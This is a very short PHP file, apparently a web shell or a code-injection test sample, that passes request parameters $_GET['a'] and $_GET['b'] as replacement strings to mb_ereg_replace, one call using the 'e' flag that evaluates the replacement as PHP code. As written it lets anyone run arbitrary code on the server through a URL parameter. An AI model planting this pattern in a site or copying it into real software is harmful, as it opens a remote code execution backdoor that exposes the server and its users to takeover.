<?php
$str = 'any string';
mb_ereg_replace('(.*)', $_GET['a'], $str, 'e');
mb_ereg_replace('(.*)', $_GET['b'], $str, 'i');
?>
